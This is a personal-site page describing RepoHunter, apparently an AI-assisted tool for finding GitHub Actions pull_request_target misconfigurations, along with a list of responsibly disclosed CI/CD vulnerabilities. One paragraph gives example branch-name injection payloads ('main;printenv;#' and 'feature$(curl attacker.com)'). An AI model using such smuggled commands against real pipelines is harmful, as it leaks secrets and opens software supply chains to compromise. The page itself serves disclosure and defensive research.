---
layout: default
title: RepoHunter
permalink: /repohunter
seo_title: "RepoHunter – AI Security and CI/CD Security Research Tool by Barak Haryati"
description: "RepoHunter is an AI-powered Application Security and CI/CD Security research tool created by Barak Haryati to detect software supply chain vulnerabilities, GitHub Actions exploitation, and DevSecOps security risks across open-source ecosystems."
keywords: "RepoHunter, Barak Haryati, Application Security, AI Security, CI/CD Security, DevSecOps Security, GitHub Actions Security, Software Supply Chain Security, Pipeline Security, Supply Chain Attack Detection, CI/CD Vulnerability Detection, Pwn Request, pull_request_target, pull_request_target exploitation, Shai-Hulud, workflow exploitation, pipeline misconfiguration, open source security research, JFrog"
og_image: "https://barak.haryati.io/assets/repohunter-ai-security-tool.png"
og_description: "RepoHunter is an AI-powered CI/CD Security and Application Security research tool by Barak Haryati for detecting GitHub Actions exploitation, software supply chain vulnerabilities, and DevSecOps security risks at scale."
---

<section class="rh-hero">
  <div class="rh-hero-content">
    <div class="rh-hero-text">
      <h1>RepoHunter</h1>
      <p class="rh-subtitle">AI-powered security research tool by <strong>Barak Haryati</strong></p>
      <p class="rh-intro">RepoHunter is an AI-powered security research tool created by Barak Haryati, Senior Director of Product Security at JFrog. It analyzes GitHub workflows and CI/CD pipelines to detect critical Application Security, AI Security, and Software Supply Chain vulnerabilities across open-source ecosystems.</p>
      <p class="rh-intro">RepoHunter focuses on CI/CD Security and DevSecOps security risks, identifying exploitable automation workflows, GitHub Actions misconfigurations, and pipeline privilege escalation that could enable large-scale supply-chain attacks.</p>
      <div class="rh-cta-row">
        <a href="https://jfrog.com/blog/jfrog-ai-bot-stopped-shai-hulud-3/" class="rh-btn rh-btn-primary" target="_blank" rel="noopener">Read the Research</a>
        <a href="https://www.linkedin.com/in/barakharyati" class="rh-btn rh-btn-secondary" target="_blank" rel="noopener">LinkedIn</a>
        <a href="/" class="rh-btn rh-btn-secondary">Back to Profile</a>
      </div>
    </div>
    <div class="rh-hero-image">
      <img src="assets/repohunter-ai-security-tool.png" alt="RepoHunter — AI-powered Application Security and CI/CD Security research tool by Barak Haryati">
    </div>
  </div>
</section>

<div class="rh-content">

<section class="rh-section">
  <h2>Detecting Software Supply Chain Vulnerabilities</h2>
  <p>RepoHunter automates the discovery of exploitable CI/CD workflow misconfigurations across open-source repositories. As an Application Security and DevSecOps research tool, it focuses on identifying dangerous patterns in GitHub Actions and related automation pipelines where untrusted input intersects with elevated permissions, secret access, or release processes.</p>
  <div class="rh-capabilities-grid">
    <div class="rh-capability">
      <h3>Workflow Analysis</h3>
      <p>Crawls public repositories and their CI/CD configurations to map the exposed attack surface, including <code>pull_request_target</code>, <code>workflow_run</code>, and <code>issue_comment</code> triggers.</p>
    </div>
    <div class="rh-capability">
      <h3>Pattern Detection</h3>
      <p>Identifies vulnerable workflow patterns where untrusted input — such as PR metadata, branch names, or fork code — intersects with elevated permissions or secret access, creating CI/CD Security and Pipeline Security risks.</p>
    </div>
    <div class="rh-capability">
      <h3>AI-Assisted Validation</h3>
      <p>Validates exploitability using AI Security techniques and generates real-world exploitation scenarios, reducing false positives and prioritizing genuine supply chain risks for CI/CD Vulnerability Detection.</p>
    </div>
    <div class="rh-capability">
      <h3>Responsible Disclosure</h3>
      <p>Produces detailed vulnerability reports with evidence, proof-of-concept demonstrations, and actionable remediation guidance for maintainers.</p>
    </div>
  </div>
</section>

<section class="rh-section">
  <h2>Application Security and DevSecOps Research</h2>
  <p>Continuous Integration workflows have become the new battleground for Software Supply Chain attacks. Incidents like the Shai-Hulud worm and the Nx project compromise — where 83,000 secrets were leaked through a single CI misconfiguration — proved that a seemingly normal pull request can compromise an entire software ecosystem.</p>
  <p>The shift to trusted publishing models, such as npm's OIDC-based approach, moved the root of trust to CI/CD. But if CI/CD itself is compromised, the entire chain collapses. RepoHunter was built by Barak Haryati to proactively detect these DevSecOps Security and Pipeline Security risks before attackers operationalize them — hunting CI takeover vulnerabilities at scale, rather than waiting for the next supply chain incident.</p>
  <div class="rh-risk-areas">
    <span class="tool-tag">CI/CD Security</span>
    <span class="tool-tag">GitHub Actions Security</span>
    <span class="tool-tag">Software Supply Chain Security</span>
    <span class="tool-tag">Application Security</span>
    <span class="tool-tag">DevSecOps Security</span>
    <span class="tool-tag">Repository Takeover</span>
    <span class="tool-tag">Secret Exfiltration</span>
    <span class="tool-tag">Artifact Poisoning</span>
    <span class="tool-tag">Pipeline Security</span>
    <span class="tool-tag">Open Source Security</span>
  </div>
</section>

<section class="rh-section">
  <h2>Security Domains Covered</h2>
  <p>Barak Haryati's research with RepoHunter contributes to multiple security domains:</p>
  <ul class="rh-domains-list">
    <li><strong>Application Security</strong> — identifying exploitable automation and code execution vulnerabilities in CI/CD workflows that lead to remote code execution and repository compromise</li>
    <li><strong>AI Security</strong> — using AI-assisted vulnerability discovery and AI-powered exploit validation to scale security research across thousands of open-source repositories</li>
    <li><strong>CI/CD Security</strong> — detecting GitHub Actions workflow takeover risks including <code>pull_request_target</code> exploitation, <code>workflow_run</code> abuse, and permission escalation</li>
    <li><strong>DevSecOps Security</strong> — protecting automated build and deployment pipelines from misconfigurations that expose secrets, tokens, and registry credentials</li>
    <li><strong>Software Supply Chain Security</strong> — preventing ecosystem-wide attacks through CI/CD compromise, including downstream poisoning of package registries (npm, PyPI, crates.io, Docker Hub)</li>
  </ul>
</section>

<section class="rh-section">
  <h2>CI/CD Exploitation Patterns Identified by Barak Haryati</h2>
  <p>Through systematic Application Security and CI/CD Security research, Barak Haryati identified three distinct classes of GitHub Actions exploitation that enable Software Supply Chain attacks. Each pattern was documented in the JFrog Security Research blog series on <code>pull_request_target</code> exploitation.</p>

  <h3>Test-Based Execution</h3>
  <p>In this exploitation class, CI/CD workflows check out pull request code and execute test scripts controlled by the attacker — such as <code>pre-commit</code>, <code>gradlew</code>, or Rust test code — in a privileged context. The attacker's code runs with access to repository secrets, write tokens, and registry credentials.</p>
  <p>Barak Haryati identified critical test-based execution vulnerabilities in QGIS (CVE-2026-24480), the widely used geospatial platform relied upon by governments and enterprises worldwide; SDKMAN (GHSA-cprm), powering the JVM developer toolchain for millions of Java developers; Typst (GHSA-j5gp), whose CI compromise exposed GitHub App credentials and Azure publishing secrets across the entire Typst language ecosystem; and Eclipse Theia (CVE-2026-1699), where npm package tokens and cross-repository deployment keys could have been exfiltrated from the cloud IDE framework.</p>
  <p><a href="https://research.jfrog.com/post/part-1-pull-request-target-exploitation" class="rh-btn rh-btn-secondary" target="_blank" rel="noopener">Read Part 1: Test-Based Execution</a></p>

  <h3>Build-Scripts and Installer-Based Execution</h3>
  <p>This CI/CD Security exploitation pattern targets workflows that execute build tools — <code>cargo build</code>, <code>npm ci</code>, <code>make</code> — on untrusted pull request code. Build hooks and lifecycle scripts (such as Rust's <code>build.rs</code>, npm's <code>preinstall</code> scripts, or Makefile targets) run attacker-controlled code automatically during the build process, inheriting the workflow's elevated permissions.</p>
  <p>Barak Haryati discovered this Application Security pattern in Petgraph, whose hundreds of millions of crate downloads meant a compromised <code>CARGO_REGISTRY_TOKEN</code> could have poisoned a core Rust library used across the ecosystem; TC39/proposal-amount (GHSA-43vf), a JavaScript standards repository where CI compromise threatened the governance integrity of the ECMAScript specification; Telepresence (GHSA-gc3r), a CNCF Kubernetes development tool where Makefile-based RCE led to full repository takeover; and Tencent/ncnn (GHSA-c44p), a mobile AI inference framework deployed in apps serving 1.4 billion users, where CMake-based execution enabled CI pipeline manipulation.</p>
  <p><a href="https://research.jfrog.com/post/part-2-pull-request-target-exploitation" class="rh-btn rh-btn-secondary" target="_blank" rel="noopener">Read Part 2: Build-Scripts and Installer-Based Execution</a></p>

  <h3>Branch and Config Injection</h3>
  <p>In this DevSecOps Security exploitation class, unsanitized branch names or configuration files controlled by the attacker are interpolated directly into shell commands within CI/CD workflows. Shell metacharacters in branch names — such as <code>main;printenv;#</code> or <code>feature$(curl attacker.com)</code> — trigger arbitrary command injection when the workflow executes.</p>
  <p>Barak Haryati identified this Pipeline Security vulnerability pattern in P4Lang/p4c (GHSA-6cw7), the reference compiler for the P4 networking language used in SDN infrastructure by Google, AT&amp;T, and Intel, where Doxygen configuration injection exposed Docker Hub credentials for supply-chain compromise; Xorbits Inference (Issue #4528), an AI model-serving framework where branch name injection exposed PyPI, Docker Hub, and Git tokens — creating a downstream compromise path into LangChain and production AI deployments; and Ceph (GHSA-p433), the distributed storage system powering cloud provider infrastructure, where branch injection enabled CI automation manipulation.</p>
  <p><a href="https://research.jfrog.com/post/part-3-pull-request-target-exploitation" class="rh-btn rh-btn-secondary" target="_blank" rel="noopener">Read Part 3: Branch and Config Injection</a></p>
</section>

<section class="rh-section">
  <h2>CI/CD and GitHub Actions Security Research Impact</h2>
  <p>Using RepoHunter, Barak Haryati performed CI/CD Vulnerability Detection and Supply Chain Attack Detection across open-source ecosystems, identifying and responsibly disclosing critical GitHub Actions Security vulnerabilities in 13 widely used projects. These findings helped prevent potential Shai-Hulud 3 style supply chain attacks that could have impacted enterprise automation, AI infrastructure, developer toolchains, and global network systems.</p>
  <div class="rh-disclosures">
    <div class="rh-disclosure-item">
      <span class="cve-severity critical">Critical</span>
      <span class="rh-project">Ansible</span>
      <span class="rh-detail">Enterprise IT automation — organization-wide package compromise</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity critical">Critical</span>
      <span class="rh-project">P4Lang</span>
      <span class="rh-detail">Network switch language — SDN infrastructure risk</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity critical">Critical</span>
      <span class="rh-project">Petgraph</span>
      <span class="rh-detail">Rust graph library — downstream crate compromise</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity critical">Critical</span>
      <span class="rh-project">QGIS</span>
      <span class="rh-detail">Geospatial platform — government and research infrastructure</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity critical">Critical</span>
      <span class="rh-project">SDKMAN</span>
      <span class="rh-detail">JVM developer toolchain — Java ecosystem impact</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity critical">Critical</span>
      <span class="rh-project">TC39</span>
      <span class="rh-detail">JavaScript standards — language-level ecosystem risk</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity critical">Critical</span>
      <span class="rh-project">Telepresence</span>
      <span class="rh-detail">CNCF Kubernetes tool — cloud-native development</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity critical">Critical</span>
      <span class="rh-project">Typst</span>
      <span class="rh-detail">Typesetting language registry — academic and publishing</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity critical">Critical</span>
      <span class="rh-project">Xorbits Inference</span>
      <span class="rh-detail">AI model-serving framework — AI infrastructure</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity critical">Critical</span>
      <span class="rh-project">Eclipse Theia</span>
      <span class="rh-detail">Cloud IDE framework — developer environment</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity high">High</span>
      <span class="rh-project">Tencent/ncnn</span>
      <span class="rh-detail">Mobile AI framework — 1.4B+ user app ecosystem</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity high">High</span>
      <span class="rh-project">Ceph</span>
      <span class="rh-detail">Distributed storage — cloud provider infrastructure</span>
    </div>
    <div class="rh-disclosure-item">
      <span class="cve-severity medium">Medium</span>
      <span class="rh-project">Parse Server</span>
      <span class="rh-detail">Backend-as-a-Service — mobile and web applications</span>
    </div>
  </div>
</section>

<section class="rh-section">
  <h2>Publications &amp; Media</h2>
  <div class="rh-publications">
    <a href="https://jfrog.com/blog/jfrog-ai-bot-stopped-shai-hulud-3/" class="rh-pub-card" target="_blank" rel="noopener">
      <h3>How JFrog's AI-Research Bot Found OSS CI/CD Vulnerabilities to Prevent Shai Hulud 3.0</h3>
      <p>JFrog Blog — by Barak Haryati, March 2026</p>
    </a>
    <a href="https://research.jfrog.com/post/part-1-pull-request-target-exploitation" class="rh-pub-card" target="_blank" rel="noopener">
      <h3>pull_request_target Exploitation — Part 1: Test-Based Execution</h3>
      <p>JFrog Security Research — by Barak Haryati, March 2026</p>
    </a>
    <a href="https://research.jfrog.com/post/part-2-pull-request-target-exploitation" class="rh-pub-card" target="_blank" rel="noopener">
      <h3>pull_request_target Exploitation — Part 2: Build-Scripts and Installer-Based Execution</h3>
      <p>JFrog Security Research — by Barak Haryati, March 2026</p>
    </a>
    <a href="https://research.jfrog.com/post/part-3-pull-request-target-exploitation" class="rh-pub-card" target="_blank" rel="noopener">
      <h3>pull_request_target Exploitation — Part 3: Branch and Config Injection</h3>
      <p>JFrog Security Research — by Barak Haryati, March 2026</p>
    </a>
  </div>
</section>

<section class="rh-section">
  <h2>About the Creator</h2>
  <p>Barak Haryati is Senior Director of Product Security at JFrog, where he leads global teams across Application Security, Cloud Security, and Security Architecture. As a vulnerability researcher specializing in AI Security, CI/CD Security, and DevSecOps Security, he created RepoHunter to proactively hunt Pipeline Security and Software Supply Chain risks before attackers can exploit them. His work spans responsible disclosure, security tooling, and AI-powered defense for software supply chains.</p>
  <div class="rh-cta-row">
    <a href="/" class="rh-btn rh-btn-secondary">Barak Haryati — Security Research Profile</a>
    <a href="/ai-security-research" class="rh-btn rh-btn-secondary">AI Security Research</a>
    <a href="https://www.linkedin.com/in/barakharyati" class="rh-btn rh-btn-secondary" target="_blank" rel="noopener">LinkedIn</a>
    <a href="https://github.com/barakharyati" class="rh-btn rh-btn-secondary" target="_blank" rel="noopener">GitHub</a>
  </div>
</section>

<section class="rh-section">
  <h2>Media</h2>
  <div class="rh-media-grid">
    <figure class="rh-blog-figure">
      <img src="assets/repohunter-workflow.png" alt="RepoHunter Workflow — Ingestion, Identification, Validation, and Disclosure pipeline">
      <figcaption>RepoHunter Workflow</figcaption>
    </figure>
    <figure class="rh-blog-figure">
      <img src="assets/repohunter-dashboard.png" alt="RepoHunter Dashboard — vulnerability scanning results across open-source repositories">
      <figcaption>RepoHunter Dashboard</figcaption>
    </figure>
  </div>
</section>

</div>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "SoftwareApplication",
  "name": "RepoHunter",
  "applicationCategory": "SecurityApplication",
  "operatingSystem": "Cross-platform",
  "creator": {
    "@type": "Person",
    "name": "Barak Haryati",
    "jobTitle": "Senior Director of Product Security",
    "worksFor": { "@type": "Organization", "name": "JFrog" },
    "url": "https://barak.haryati.io"
  },
  "description": "RepoHunter is an AI-powered Application Security and CI/CD Security research tool created by Barak Haryati to detect software supply chain vulnerabilities, GitHub Actions exploitation, DevSecOps security risks, and pipeline misconfigurations across open-source ecosystems. It uses AI-assisted vulnerability discovery to perform CI/CD Vulnerability Detection and Supply Chain Attack Detection at scale.",
  "url": "https://barak.haryati.io/repohunter",
  "image": "https://barak.haryati.io/assets/repohunter-ai-security-tool.png",
  "keywords": "RepoHunter, Barak Haryati, Application Security, AI Security, CI/CD Security, DevSecOps Security, GitHub Actions Security, Software Supply Chain Security, Pipeline Security, Supply Chain Attack Detection, CI/CD Vulnerability Detection, Pwn Request, pull_request_target, pull_request_target exploitation, Shai-Hulud, open source security research, JFrog, workflow exploitation, pipeline misconfiguration, repository takeover, secret exfiltration"
}
</script>

<footer>
  <p>&copy; 2025 Barak Haryati &middot; Security Leader &middot; AppSec &middot; Cloud &middot; AI Security</p>
</footer>
